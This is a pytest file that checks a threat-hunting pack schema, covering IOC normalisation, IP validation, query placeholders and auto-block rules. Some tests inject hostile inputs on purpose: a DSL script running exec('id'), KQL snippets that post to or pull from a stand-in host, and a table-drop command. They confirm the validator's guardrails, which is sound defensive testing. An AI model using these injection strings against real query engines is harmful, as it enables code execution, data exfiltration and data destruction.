from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.schemas.hunting_pack import HuntingPackV2

EXAMPLE = Path(__file__).resolve().parent.parent / "contracts" / "examples" / "clickfix_pack.example.json"


@pytest.fixture
def pack_dict() -> dict:
    return json.loads(EXAMPLE.read_text(encoding="utf-8"))


def _mutate(d: dict, fn) -> dict:
    d = copy.deepcopy(d)
    fn(d)
    return d


def test_example_pack_is_valid_and_round_trips(pack_dict):
    pack = HuntingPackV2.model_validate(pack_dict)
    assert pack.schema_version == "2.0"
    assert HuntingPackV2.model_validate(pack.wire_dict()) == pack
    assert all(t.compiled_queries.kql_defender is None for t in pack.internal_hunting_tasks)  # D-63


def test_a_pack_issued_before_d63_with_kql_still_validates(pack_dict):
    def old_style(d):
        d["internal_hunting_tasks"][0]["compiled_queries"]["kql_defender"] = "DeviceProcessEvents | take 1"

    HuntingPackV2.model_validate(_mutate(pack_dict, old_style))


def test_content_hash_ignores_identity_fields(pack_dict):
    a = HuntingPackV2.model_validate(pack_dict)
    b = HuntingPackV2.model_validate(
        _mutate(
            pack_dict,
            lambda d: (
                d.update(pack_id="00000000-0000-4000-8000-000000000001", timestamp="2026-10-31T00:00:00Z"),
                d.pop("expires_at"),
            ),
        )
    )
    assert a.content_sha256() == b.content_sha256()
    assert a.wire_bytes() != b.wire_bytes()


def test_iocs_are_normalised_and_deduplicated(pack_dict):
    d = _mutate(
        pack_dict,
        lambda d: d["prevention_blocklist"].update(
            domains=["Evil.EXAMPLE.", "evil.example", "*.TryCloudflare.com"],
            hashes=["A" * 64, "a" * 64],
        ),
    )
    bl = HuntingPackV2.model_validate(d).prevention_blocklist
    assert bl.domains == ["*.trycloudflare.com", "evil.example"]
    assert bl.hashes == ["a" * 64]


@pytest.mark.parametrize("ip", ["10.1.2.3", "192.168.0.0/24", "127.0.0.1", "100.64.0.1", "203.0.113.7"])
def test_non_global_ips_rejected(pack_dict, ip):
    with pytest.raises(ValidationError, match="not globally routable"):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: d["prevention_blocklist"].update(ips=[ip])))


def test_overbroad_cidr_rejected(pack_dict):
    # Shape-valid public address; whether it is *safe* to block is the whitelist filter's job (Phase 2).
    ok = HuntingPackV2.model_validate(
        _mutate(pack_dict, lambda d: d["prevention_blocklist"].update(ips=["1.1.1.1/32"]))
    )
    assert ok.prevention_blocklist.ips == ["1.1.1.1"]
    with pytest.raises(ValidationError, match="too broad"):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: d["prevention_blocklist"].update(ips=["1.0.0.0/16"])))


def test_all_zero_jarm_rejected(pack_dict):
    with pytest.raises(ValidationError, match="all-zero JARM"):
        HuntingPackV2.model_validate(
            _mutate(pack_dict, lambda d: d["prevention_blocklist"].update(jarm_fingerprints=["0" * 62]))
        )


def test_script_in_dsl_rejected(pack_dict):
    def inject(d):
        d["internal_hunting_tasks"][0]["compiled_queries"]["wazuh_es_dsl"]["query"]["bool"]["filter"] = [
            {"script": {"script": {"source": "Runtime.getRuntime().exec('id')"}}}
        ]

    with pytest.raises(ValidationError, match="forbidden DSL key 'script'"):
        HuntingPackV2.model_validate(_mutate(pack_dict, inject))


@pytest.mark.parametrize(
    "snippet",
    [
        "| externaldata (x:string) [@'https://x.example/a']",
        "| evaluate http_request_post('https://x.example')",
        "\n.drop table DeviceEvents",
    ],
)
def test_dangerous_kql_rejected(pack_dict, snippet):
    """New packs carry no KQL (D-63); the retired field keeps its guardrails for packs issued before."""

    def inject(d):
        d["internal_hunting_tasks"][0]["compiled_queries"]["kql_defender"] = "DeviceProcessEvents | take 1 " + snippet

    with pytest.raises(ValidationError):
        HuntingPackV2.model_validate(_mutate(pack_dict, inject))


def test_placeholders_must_be_declared(pack_dict):
    def use_placeholder(d, declare):
        task = d["internal_hunting_tasks"][0]
        task["compiled_queries"]["kql_defender"] = (
            "DeviceLogonEvents | where RemoteIP in (${HC_EDGE_DEVICE_INTERNAL_IPS})"
        )
        if declare:
            task["scope_placeholders"] = ["EDGE_DEVICE_INTERNAL_IPS"]

    with pytest.raises(ValidationError, match="not declared"):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: use_placeholder(d, False)))
    HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: use_placeholder(d, True)))


def test_unknown_placeholder_rejected(pack_dict):
    def inject(d):
        d["internal_hunting_tasks"][0]["compiled_queries"]["kql_defender"] = "X | where a == '${HC_DOMAIN_ADMINS}'"

    with pytest.raises(ValidationError, match="unknown scope placeholders"):
        HuntingPackV2.model_validate(_mutate(pack_dict, inject))


def test_auto_block_requires_high_confidence(pack_dict):
    d = _mutate(pack_dict, lambda d: d["soar_playbook_hints"].update(auto_block_pre_iocs=True))
    with pytest.raises(ValidationError, match="confidence_score >= 80"):
        HuntingPackV2.model_validate(d)
    d["confidence_score"] = 85
    HuntingPackV2.model_validate(d)


def test_duplicate_task_ids_rejected(pack_dict):
    def dup(d):
        d["internal_hunting_tasks"][1]["task_id"] = d["internal_hunting_tasks"][0]["task_id"]

    with pytest.raises(ValidationError, match="unique"):
        HuntingPackV2.model_validate(_mutate(pack_dict, dup))


def test_naive_timestamp_and_bad_expiry_rejected(pack_dict):
    with pytest.raises(ValidationError):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: d.update(timestamp="2026-10-30T07:00:00")))
    with pytest.raises(ValidationError, match="expires_at"):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: d.update(expires_at="2027-01-01T00:00:00Z")))


def test_invalid_sigma_and_unknown_fields_rejected(pack_dict):
    with pytest.raises(ValidationError, match="missing keys"):
        HuntingPackV2.model_validate(
            _mutate(pack_dict, lambda d: d["internal_hunting_tasks"][0].update(sigma_yaml="title: x\n"))
        )
    with pytest.raises(ValidationError, match="Extra inputs"):
        HuntingPackV2.model_validate(_mutate(pack_dict, lambda d: d.update(tenant_internal_ip="10.0.0.1")))
